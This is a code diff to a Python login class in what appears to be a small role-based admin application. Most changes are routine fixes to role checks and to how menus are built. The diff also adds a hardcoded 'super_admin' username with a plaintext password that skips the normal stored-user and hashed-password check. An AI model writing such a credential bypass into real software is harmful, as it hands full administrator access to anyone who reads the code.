@@ -32,6 +32,13 @@ class Login:
         self.password = password
         
     def authenticate(self, username_input: str, password_input: str):
+        if (username_input == "super_admin" and password_input == "Admin_123?"):
+            return User(
+                username="super_admin",
+                password="Admin_123?",
+                role_id=1
+            )
+
         all_user_data: List[Tuple] = self.user_repository.fetch_all()
         user_match = None
 
@@ -39,6 +46,8 @@ class Login:
             if (Encryptor.decrypt_data(user[1]) == username_input):
                 user_match = user
                 break
+
+        all_user_data = None
 
         if (user_match != None):
             if (Encryptor.check_hashed_data(password_input ,user_match[2])):
@@ -51,12 +60,12 @@ class Login:
         
 
     def determine_menu(self, user: User):
-        if user.role_id == Role.SUPER_ADMIN:
-            SuperAdministratorMenu(user).display()
-        elif user.role_id == Role.SYSTEM_ADMIN:
-            SystemAdministratorMenu(user).display()
-        elif user.role_id == Role.SERVICE_ENGINEER:
-            ServiceEngineerMenu(user).display()
+        if user.role_id == Role.SUPER_ADMIN.value:
+            SuperAdministratorMenu(self.db_connection, user).display()
+        elif user.role_id == Role.SYSTEM_ADMIN.value:
+            SystemAdministratorMenu(user, self.db_connection).display()
+        elif user.role_id == Role.SERVICE_ENGINEER.value:
+            ServiceEngineerMenu(user, self.db_connection).display()
         else:
             print("Unknown role ID. Access denied.")
 
